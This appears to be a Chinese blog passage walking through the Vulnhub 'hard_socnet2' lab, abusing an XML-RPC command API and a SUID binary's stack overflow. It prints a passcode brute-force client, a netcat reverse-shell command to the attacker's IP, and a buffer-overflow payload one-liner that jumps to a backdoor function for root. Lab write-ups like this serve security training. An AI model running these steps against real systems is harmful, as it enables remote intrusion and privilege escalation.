+<h2><span id="又见monitorpy">又见monitor.py</span></h2><p>进入 目录 发现存在三个文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678804207775-138234aa-39aa-4f24-9548-9de7d1e75605.png#averageHue=%23242732&clientId=u45cd59b4-6475-4&from=paste&height=150&id=u9dc755b0&name=image.png&originHeight=150&originWidth=556&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25930&status=done&style=none&taskId=u0865e6d4-1098-4e0f-8ac1-e3d840799bb&title=&width=556" alt="image.png"><br>monitor.py   这个文件好像在哪里见过<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678804235805-bc4737a8-6fcf-44b9-93d4-0a9505dec793.png#averageHue=%23dbb078&clientId=u45cd59b4-6475-4&from=paste&height=232&id=u64c45b62&name=image.png&originHeight=232&originWidth=741&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20669&status=done&style=none&taskId=uc9227272-fd62-43f3-98f3-6f3a0fc89c5&title=&width=741" alt="image.png"><br>这是管理写的一个脚本<br><a name="o20P9"></a></p>
+<h3><span id="进程">进程</span></h3><p>查看 进程里面是否存在这个monitor.py文件 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678804409816-b69a8b2b-ddbd-495e-b676-f9a7ecd5cc03.png#averageHue=%23252935&clientId=u45cd59b4-6475-4&from=paste&height=123&id=ud353c3ef&name=image.png&originHeight=123&originWidth=1002&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45250&status=done&style=none&taskId=u088c3073-90f1-40b0-b62f-f45ce47ff54&title=&width=1002" alt="image.png"><br>monitor文件是在运行的<br>查看一下源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#my remote server management API<br>import SimpleXMLRPCServer<br>import subprocess<br>import random<br><br>debugging_pass = random.randint(1000,9999)<br><br>def runcmd(cmd):<br>    results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)<br>    output = results.stdout.read() + results.stderr.read()<br>    return output<br><br>def cpu():<br>    return runcmd(&quot;cat /proc/cpuinfo&quot;)<br><br>def mem():<br>    return runcmd(&quot;free -m&quot;)<br><br>def disk():<br>    return runcmd(&quot;df -h&quot;)<br><br>def net():<br>    return runcmd(&quot;ip a&quot;)<br><br>def secure_cmd(cmd,passcode):<br>    if passcode==debugging_pass:<br>         return runcmd(cmd)<br>    else:<br>        return &quot;Wrong passcode.&quot;<br><br>server = SimpleXMLRPCServer.SimpleXMLRPCServer((&quot;0.0.0.0&quot;, 8000))<br>server.register_function(cpu)<br>server.register_function(mem)<br>server.register_function(disk)<br>server.register_function(net)<br>server.register_function(secure_cmd)<br><br>server.serve_forever()<br><br></code></pre></td></tr></table></figure>
+<p>#这是我的远程服务器的API<br>导入了三个库 <br>import SimpleXMLRPCServer    XML-RPC 服务器 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678804890661-b116969e-b7b3-4b7d-b1b9-22b7ee803d00.png#averageHue=%23f7f3f1&clientId=u45cd59b4-6475-4&from=paste&height=853&id=ufadd34b6&name=image.png&originHeight=853&originWidth=994&originalType=binary&ratio=1&rotation=0&showTitle=false&size=148000&status=done&style=none&taskId=u553bfde2-2437-4c05-8ba4-5d502a79a6a&title=&width=994" alt="image.png"><br>import subprocess  &#x2F;&#x2F;管理进程 ，创建进程的一个库  <br>import random  &#x2F;&#x2F;随机元素 ，随机的库<br>这里除了 random用过其他两个根本没有用过 不知道干啥的 头疼 </p>
+<p><a name="uZEEy"></a></p>
+<h2><span id="xml-rpc">XML-RPC</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678805010410-5fbbd7b2-973d-45f0-ab8f-5f0c7d3363b9.png#averageHue=%23fdfcfb&clientId=u45cd59b4-6475-4&from=paste&height=201&id=u4d749529&name=image.png&originHeight=201&originWidth=1269&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35752&status=done&style=none&taskId=u66f19896-d4b2-4b25-a4f7-eb40cdb9d2d&title=&width=1269" alt="image.png"><br>简单来说就是可以利用这种技术在服务器端生成一个服务器端的API，程序接口<br>这个接口可以客服端的同样使用XML-RPC 访问 服务端接口，运行其中的函数 ，实现程序交互 </p>
+<p><a name="h4Mnx"></a></p>
+<h3><span id="命令执行">命令执行</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">def cpu():<br>    return runcmd(&quot;cat /proc/cpuinfo&quot;)<br><br>def mem():<br>    return runcmd(&quot;free -m&quot;)<br><br>def disk():<br>    return runcmd(&quot;df -h&quot;)<br><br>def net():<br>    return runcmd(&quot;ip a&quot;)<br>这些都是特定的 命令 ，就算调用了 这些个函数也只能相对应的函数<br><br><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">def secure_cmd(cmd,passcode):<br>    if passcode==debugging_pass:<br>         return runcmd(cmd)<br>    else:<br>        return &quot;Wrong passcode.&quot;<br>但是这里不一样了 ，这里的cmd 命令是自己可以去定义的<br>但是这里有一个条件 ,passcode 要等于  debuggin_pass <br>debuggin_pass 是随机数  1000 - 9999 之间的<br></code></pre></td></tr></table></figure>
+<p>写 一个客服端去连接服务器端  去爆破 <br>先使用客户端去连接 查看cpu 的信息 是否能执行cpu函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678806986457-06d686f2-b9dc-45a1-89a2-5832ab6e9aec.png#averageHue=%23242732&clientId=u45cd59b4-6475-4&from=paste&height=124&id=u35929e77&name=image.png&originHeight=124&originWidth=709&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20839&status=done&style=none&taskId=u7eb8eb8c-15fe-4071-ab00-5721344497f&title=&width=709" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import xmlrpc.client<br><br>with xmlrpc.client.ServerProxy(&quot;http://192.168.145.133:8000/&quot;) as proxy:<br>    print(str(proxy.cpu()))<br><br></code></pre></td></tr></table></figure>
+<p>成功执行<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678807002666-efdee9c8-f4be-482a-bc1e-d0a3f80cb2b5.png#averageHue=%23242630&clientId=u45cd59b4-6475-4&from=paste&height=333&id=u4b373fb0&name=image.png&originHeight=333&originWidth=643&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42264&status=done&style=none&taskId=uda9e22d8-297e-42c1-b1db-665675af3ed&title=&width=643" alt="image.png"><br>现在要暴力破解 debugging_pass<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678807398614-d84b2c71-3f61-4efc-9460-32335ddc446d.png#averageHue=%23242732&clientId=u45cd59b4-6475-4&from=paste&height=143&id=u27c5410c&name=image.png&originHeight=143&originWidth=719&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24102&status=done&style=none&taskId=u73c58f40-1ef8-4ec8-aebb-dede0f19f2c&title=&width=719" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import xmlrpc.client<br><br>with xmlrpc.client.ServerProxy(&quot;http://192.168.145.133:8000/&quot;) as proxy:<br>    for p in range(1000,10000):<br>        r = str(proxy.secure_cmd(&#x27;whoami&#x27;,p))<br>        if not &quot;Wrong&quot; in r:<br>            print(p)<br>            print(r)<br>            break<br><br></code></pre></td></tr></table></figure>
+<p>暴力破解出来的是  7171 执行的whoami命令是socnet <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678807431584-6b36b83b-bcc8-425d-ac10-237eff2c88b4.png#averageHue=%23232630&clientId=u45cd59b4-6475-4&from=paste&height=101&id=u955800d9&name=image.png&originHeight=101&originWidth=337&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8125&status=done&style=none&taskId=u3dce763e-4c82-434b-b931-0372f92627c&title=&width=337" alt="image.png"><br>找到了密码7171  , 那这里要进行反弹shell<br>反弹shell 脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import xmlrpc.client<br><br>with xmlrpc.client.ServerProxy(&quot;http://192.168.145.133:8000/&quot;) as proxy:<br>    cmd = &quot;nc 192.168.145.130 1233 | /bin/sh | nc 192.168.145.130  1235  &quot;<br>    s = str(proxy.secure_cmd(cmd,7171))<br>    print(s)<br><br></code></pre></td></tr></table></figure>
+<p>这里我使用的nc 串联的方式反弹shell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678808009392-e29a117a-1f9e-4135-89cf-b1865343f38f.png#averageHue=%23252935&clientId=u45cd59b4-6475-4&from=paste&height=561&id=u02b04b78&name=image.png&originHeight=561&originWidth=790&originalType=binary&ratio=1&rotation=0&showTitle=false&size=184759&status=done&style=none&taskId=ua9db5534-4490-4020-bea4-23b9f829f93&title=&width=790" alt="image.png"><br>查看目录下的文件 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678885416366-2fab01d3-ed62-47fb-9404-cb4e47a9b54c.png#averageHue=%23232631&clientId=u5df2be7d-b1b9-4&from=paste&height=127&id=u9b97f3d5&name=image.png&originHeight=127&originWidth=447&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11528&status=done&style=none&taskId=u05c8aa14-4d64-454e-beff-d50738de15b&title=&width=447" alt="image.png"><br>目录下存在三个文件，现在想办法提权<br>monitor.py 就是前面存在漏洞的文件，让我们登录socnet 用户的漏洞文件，<br>peda 应该是个插件 gdb 的<br>还有一个add_record文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678885617616-4faadd27-ee6f-43cf-8771-e90cb4b53012.png#averageHue=%23252935&clientId=u5df2be7d-b1b9-4&from=paste&height=71&id=uf9eb165d&name=image.png&originHeight=71&originWidth=1268&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32119&status=done&style=none&taskId=u62cb1950-b782-475f-bbc1-c8f8aea0efc&title=&width=1268" alt="image.png"><br>是一个可执行程序<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678885648727-c87b998d-d0c3-47b6-9e48-c35a035e7452.png#averageHue=%23262b37&clientId=u5df2be7d-b1b9-4&from=paste&height=306&id=u80847211&name=image.png&originHeight=306&originWidth=645&originalType=binary&ratio=1&rotation=0&showTitle=false&size=101924&status=done&style=none&taskId=ub1450f72-65fc-412c-b845-a9819c8496a&title=&width=645" alt="image.png"><br>这个可执行文件是存在 root 权限的<br><a name="qZWlu"></a></p>
+<h1><span id="分析程序">分析程序</span></h1><p>本地是存在gdb 程序的 而且peda 插件<br>可能是让分析add_record 程序 是否存在溢出漏洞 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678885891486-fb40f37c-a5b9-44ca-b720-6215f4e148f6.png#averageHue=%23262a36&clientId=u5df2be7d-b1b9-4&from=paste&height=298&id=uad99a9b5&name=image.png&originHeight=298&originWidth=710&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98246&status=done&style=none&taskId=u6deaf9f6-4065-4a26-955b-fb18a1fe119&title=&width=710" alt="image.png"><br>先执行一下 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678886150356-5267def4-b88d-4e1b-860c-61a24d76d34b.png#averageHue=%23363a42&clientId=u5df2be7d-b1b9-4&from=paste&height=114&id=u1f7f31b5&name=image.png&originHeight=114&originWidth=812&originalType=binary&ratio=1&rotation=0&showTitle=false&size=110347&status=done&style=none&taskId=udad969d3-309b-4a06-9f5c-e460422466f&title=&width=812" alt="image.png"><br>翻译一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678886217285-ecf47922-7da6-4b5e-9a62-6060405c551c.png#averageHue=%232e2f30&clientId=u5df2be7d-b1b9-4&from=paste&height=463&id=u09d29ddb&name=image.png&originHeight=463&originWidth=625&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60449&status=done&style=none&taskId=uee2c9e49-9745-4b4b-8e15-ca7240a8e19&title=&width=625" alt="image.png"><br>他是可以添加 员工信息的<br>他有很多可以自己看着输入的内容的点 <br>一个反馈 功能 ，<br>可以输入很多信息 ，<br>最简单的缓冲区溢出就是添加大量的垃圾字符 。 不知道是否存在 缓冲区溢出漏洞<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678886741623-69c1ee0a-0ef8-47f9-9dfa-fba486ab8621.png#averageHue=%23252834&clientId=u5df2be7d-b1b9-4&from=paste&height=442&id=udb1c090e&name=image.png&originHeight=442&originWidth=1029&originalType=binary&ratio=1&rotation=0&showTitle=false&size=185335&status=done&style=none&taskId=uef387d8e-188c-43f1-a783-0c9fd2c4bad&title=&width=1029" alt="image.png"><br>感觉运行不了 不输出卡死 <br>生成500 个 A 的垃圾字符<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678886918527-c479b432-da28-464c-9080-4b50a053b4d4.png#averageHue=%23252935&clientId=u5df2be7d-b1b9-4&from=paste&height=799&id=u66339200&name=image.png&originHeight=799&originWidth=1232&originalType=binary&ratio=1&rotation=0&showTitle=false&size=361656&status=done&style=none&taskId=u29089952-2ebe-4ba8-9070-bf32fefed89&title=&width=1232" alt="image.png"><br>去测试<br>输入大量的A <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678886974905-b56c7919-ef5e-4f60-b1f1-feea4efec875.png#averageHue=%232a313f&clientId=u5df2be7d-b1b9-4&from=paste&height=286&id=u289dff82&name=image.png&originHeight=286&originWidth=612&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63657&status=done&style=none&taskId=u8d31418d-b8cc-4dcf-8a7c-b1d9d525f21&title=&width=612" alt="image.png"><br>是个正常的退出<br><a name="G5t8L"></a></p>
+<h2><span id="溢出">溢出</span></h2><p>经过测试<br>存在溢出的点在于Explain <br>堆栈存在大量的A<br> <img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678887134721-2075fc92-dae9-43f6-9edd-3584c0097f88.png#averageHue=%232f343e&clientId=u5df2be7d-b1b9-4&from=paste&height=640&id=ub2acafcb&name=image.png&originHeight=640&originWidth=1149&originalType=binary&ratio=1&rotation=0&showTitle=false&size=647848&status=done&style=none&taskId=uba6d2f26-bbeb-467d-8612-432bc1391b9&title=&width=1149" alt="image.png"><br>EIP  寄存器 也被A覆盖了 <br>输入   pattern create 100<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678887454258-22f99c36-70ad-41ed-ba07-9c55f0c1f9c3.png#averageHue=%23252a36&clientId=u990c4d5b-f100-4&from=paste&height=328&id=udb167033&name=image.png&originHeight=328&originWidth=619&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73604&status=done&style=none&taskId=u44867e5d-32b6-4b96-9f8e-0442ecfacad&title=&width=619" alt="image.png"><br>AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL<br>把这个再放在存在溢出的那里<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678887572992-474d7fe4-a71f-4f44-ae5f-b1aea2b6a499.png#averageHue=%23252a37&clientId=u990c4d5b-f100-4&from=paste&height=596&id=u79e651dd&name=image.png&originHeight=596&originWidth=622&originalType=binary&ratio=1&rotation=0&showTitle=false&size=173025&status=done&style=none&taskId=u3db5f27f-f6e7-48cb-ab17-6124a66dc6f&title=&width=622" alt="image.png"><br>使用 <br>pattern search 命令 查找寄存器的偏移量<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678887693135-230c14eb-2a7d-41c6-96f6-d558b331b70f.png#averageHue=%23262a37&clientId=u990c4d5b-f100-4&from=paste&height=810&id=u3adcdba4&name=image.png&originHeight=810&originWidth=571&originalType=binary&ratio=1&rotation=0&showTitle=false&size=251358&status=done&style=none&taskId=uc11e2a37-0610-4517-adfa-f8a97176a57&title=&width=571" alt="image.png"><br>重点查看 EIP 寄存器</p>
+<blockquote>
+<p>EIP+0 found at offset: 62</p>
+</blockquote>
+<p>从第63 个 开始 会溢出explain<br>  生成<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678887889202-1fa14fa3-b23b-43cc-8c20-58bf89315988.png#averageHue=%23282e3e&clientId=u990c4d5b-f100-4&from=paste&height=41&id=u569d41f2&name=image.png&originHeight=41&originWidth=558&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10555&status=done&style=none&taskId=uf1d72964-3c52-4210-8198-685d06ab037&title=&width=558" alt="image.png"><br>EIP 寄存器被填入了 FFFF<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678887938861-ac05daec-25d5-4512-a811-d894ad246181.png#averageHue=%23252936&clientId=u990c4d5b-f100-4&from=paste&height=623&id=u7a82a1bb&name=image.png&originHeight=623&originWidth=636&originalType=binary&ratio=1&rotation=0&showTitle=false&size=187283&status=done&style=none&taskId=u2d6c0d3d-a4b4-48db-aaf9-49210cadbd4&title=&width=636" alt="image.png"><br>可以正面存在缓冲区溢出了 </p>
+<blockquote>
+<p>disas mian</p>
+</blockquote>
+<p>  查看一下汇编代码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678888061459-a23c9213-33af-4ffb-9831-881c5adbc3c6.png#averageHue=%23272b38&clientId=u990c4d5b-f100-4&from=paste&height=575&id=u761faf8a&name=image.png&originHeight=575&originWidth=538&originalType=binary&ratio=1&rotation=0&showTitle=false&size=195042&status=done&style=none&taskId=ua356afd1-02b1-49e5-9037-e7415cdc743&title=&width=538" alt="image.png"><br>下个断点<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678888438367-ee52d819-630e-4b61-919f-33f5a29642ac.png#averageHue=%23252935&clientId=u990c4d5b-f100-4&from=paste&height=73&id=uf1a7da65&name=image.png&originHeight=73&originWidth=372&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12579&status=done&style=none&taskId=u413d9f30-dc68-48ab-8852-4aa1e25c1ca&title=&width=372" alt="image.png"><br>r  一下 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678888491313-9ad4842f-d962-48e7-9112-4514034aa5eb.png#averageHue=%23252936&clientId=u990c4d5b-f100-4&from=paste&height=690&id=u5cf78069&name=image.png&originHeight=690&originWidth=601&originalType=binary&ratio=1&rotation=0&showTitle=false&size=213902&status=done&style=none&taskId=u2f728c54-f5f0-403b-a1cb-b4d47f692a6&title=&width=601" alt="image.png"><br>现在是push eax 寄存器 <br>s  单步执行一下   每次只执行一个cpu的指令<br>现在是到了call 这里 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678888549355-7f92a336-a4d5-403c-bde0-c18c8f863f5e.png#averageHue=%23252a37&clientId=u990c4d5b-f100-4&from=paste&height=747&id=u14648c04&name=image.png&originHeight=747&originWidth=569&originalType=binary&ratio=1&rotation=0&showTitle=false&size=239161&status=done&style=none&taskId=u352de604-3949-4cf7-8fbd-8c65a5c4384&title=&width=569" alt="image.png"><br>下 下一个断点<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678888678145-fb202479-bebe-4b46-9834-039d4591ffff.png#averageHue=%23242733&clientId=u990c4d5b-f100-4&from=paste&height=105&id=u6308cccb&name=image.png&originHeight=105&originWidth=377&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14126&status=done&style=none&taskId=u5d306591-6bb4-4fdc-ac67-0136544a27a&title=&width=377" alt="image.png"><br>r<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678888718553-9ab243e9-f9bf-4193-8e36-0c6cc8cffd33.png#averageHue=%23252a37&clientId=u990c4d5b-f100-4&from=paste&height=458&id=ufcc79141&name=image.png&originHeight=458&originWidth=623&originalType=binary&ratio=1&rotation=0&showTitle=false&size=153073&status=done&style=none&taskId=u517f6134-7a5e-4565-9305-02f510f73e3&title=&width=623" alt="image.png"><br>s 单步跟进 <br>他就到了 <br>arg[0]: 0x80489e2 (“Years worked(int): “)  这里   <br>第二次提问<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678888746671-473d2953-26dc-40af-9a9b-d75899f5ba9b.png#averageHue=%23252a37&clientId=u990c4d5b-f100-4&from=paste&height=462&id=u9b52437e&name=image.png&originHeight=462&originWidth=592&originalType=binary&ratio=1&rotation=0&showTitle=false&size=145032&status=done&style=none&taskId=u04d815af-fab3-47f6-aa65-e70985d2fd3&title=&width=592" alt="image.png"><br>再下 一个 断点<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678888840795-f11ca659-e797-4b8d-abf3-84994755cc33.png#averageHue=%23252935&clientId=u990c4d5b-f100-4&from=paste&height=738&id=u7f1580d1&name=image.png&originHeight=738&originWidth=641&originalType=binary&ratio=1&rotation=0&showTitle=false&size=225996&status=done&style=none&taskId=u093e5259-0ef6-4bae-b883-70f7c6a042a&title=&width=641" alt="image.png"><br><a name="KWzKm"></a></p>
+<h2><span id="backdoor-后门">backdoor 后门</span></h2><p>查看一下函数信息 </p>
+<blockquote>
+<p>info  func </p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678888978897-4022a502-88bb-46a2-b359-e4a1167bf3e7.png#averageHue=%23252936&clientId=u990c4d5b-f100-4&from=paste&height=545&id=u780d4f52&name=image.png&originHeight=545&originWidth=542&originalType=binary&ratio=1&rotation=0&showTitle=false&size=145798&status=done&style=none&taskId=u431df60a-d4b2-4b1e-9097-585a1182bc7&title=&width=542" alt="image.png"><br>函数里面是存在system 函数 和suid 函数  可以去执行系统指令 或者执行root 权限的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678889076025-0a9416bf-d5e1-4a47-90ad-6eaa37545ca1.png#averageHue=%23262a37&clientId=u990c4d5b-f100-4&from=paste&height=126&id=u1984108b&name=image.png&originHeight=126&originWidth=416&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19990&status=done&style=none&taskId=uf6b586ab-cb35-4b98-9741-cec329015d3&title=&width=416" alt="image.png"><br>这里存在两个函数 <br>一个 backdoor 函数  后门的意思 <br>vlun 函数<br>先查看 vuln 函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678889134886-e55af831-ab87-4a34-95cc-083fd44c84cf.png#averageHue=%23262a37&clientId=u990c4d5b-f100-4&from=paste&height=335&id=udca2ee6a&name=image.png&originHeight=335&originWidth=539&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100812&status=done&style=none&taskId=ucb3efef3-8b48-4234-97b9-564d15db2da&title=&width=539" alt="image.png"><br>调用了 strcpy <br> strcpy 是存在缓冲区漏洞的<br>查看 backdoor 函数 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678889268838-19c94e7e-529c-4ab6-aa08-76317181603d.png#averageHue=%23262a37&clientId=u990c4d5b-f100-4&from=paste&height=363&id=u1277b3b9&name=image.png&originHeight=363&originWidth=564&originalType=binary&ratio=1&rotation=0&showTitle=false&size=116424&status=done&style=none&taskId=u5bde1fcb-297e-48a0-acd8-c9f095bf7be&title=&width=564" alt="image.png"><br>他这里是调用了suid  和 system 函数的<br><a name="ezLiC"></a></p>
+<h1><span id="二次提权">二次提权</span></h1><p>利用python 的拼接，调用库功能，来实现反向拼接。<br>为了完整的进行程序入口拼接，需要将用户名，年限，薪资等数据按照换行来输入（这我的用户名abc 年限为2 薪资为1 与遇上了工作上的问题1），并生成一个payload文件</p>
+<blockquote>
+<p>python -c “import struct; print(‘abc\n2\n3\n1\n’ + ‘A’*62 + struct.pack(‘I’, 0x08048676))” &gt;payload</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678889686794-9bacada9-b821-4371-892e-4f00cdd3b844.png#averageHue=%23252935&clientId=u990c4d5b-f100-4&from=paste&height=96&id=u117c5ebb&name=image.png&originHeight=96&originWidth=623&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25317&status=done&style=none&taskId=u3839a91c-05ff-4d57-8bb8-f5c0e698c58&title=&width=623" alt="image.png"><br>利用这个payload造成缓冲区漏洞 来 获取root权限<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678889804187-b075d053-850e-4339-a8fe-c2984d0f5ca8.png#averageHue=%23242732&clientId=u990c4d5b-f100-4&from=paste&height=273&id=uc42047d4&name=image.png&originHeight=273&originWidth=632&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47284&status=done&style=none&taskId=uf4eeb0fa-3517-48c6-8edb-0f89dcd194a&title=&width=632" alt="image.png"><br>提权成功</p>
+<p>参考 ： <br><a target="_blank" rel="noopener" href="https://www.modb.pro/db/223374">https://www.modb.pro/db/223374</a><br><a target="_blank" rel="noopener" href="http://www.caidexin.top/2021/10/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/hard_socnet2/">http://www.caidexin.top/2021/10/02/blog_formal&#x2F;security&#x2F;%E9%9D%B6%E5%9C%BA&#x2F;hard_socnet2&#x2F;</a></p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/03/19/Breach%201.0/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>Breach 1.0</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/03/19/Prime_Series_Level-1/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      Prime_series_Level-1
+    </a>
+  
+</div>
+
+    
+      <div class="related-post">
+  <div class="related__head">
+  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-tag">#渗透测试</a>
+
+</div>
+  <div class="realated__body">
+    
+      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
+    
+  </div>
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              
+                <div class="matts">浮</div>
+              
+                <div class="matts">云</div>
+              
+                <div class="matts">游</div>
+              
+                <div class="matts">子</div>
+              
+                <div class="matts">意</div>
+              
+            </div>
+          
+            <div class="foot-line">
+              
+                <div class="matts">落</div>
+              
+                <div class="matts">日</div>
+              
+                <div class="matts">故</div>
+              
+                <div class="matts">人</div>
+              
+                <div class="matts">情</div>
+              
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
